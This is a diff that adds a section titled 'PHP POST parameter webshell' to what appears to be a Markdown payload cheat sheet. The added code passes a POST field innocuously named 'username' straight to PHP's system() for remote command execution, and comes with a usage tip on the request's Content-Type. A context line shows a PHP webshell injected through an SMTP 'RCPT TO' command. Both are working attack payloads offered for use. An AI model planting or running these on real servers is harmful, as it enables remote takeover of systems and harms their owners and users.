@@ -1262,6 +1262,26 @@ RCPT TO:<?php system($_GET['c']); ?>
 
 --------------
 
+### PHP POST parameter webshell
+
+- Code-:
+
+```php
+<?php
+
+if (isset($_POST['username'])) {
+  echo system($_POST['username']);
+}else {
+    echo "No username provided";
+}
+?>
+```
+
+- Don't forget to set `Content-Type` to `application/x-www-form-urlencoded`
+
+![image](https://github.com/user-attachments/assets/152b8515-3a83-41bd-a356-306eef7f4e2e)
+
+--------------------
 
 
 
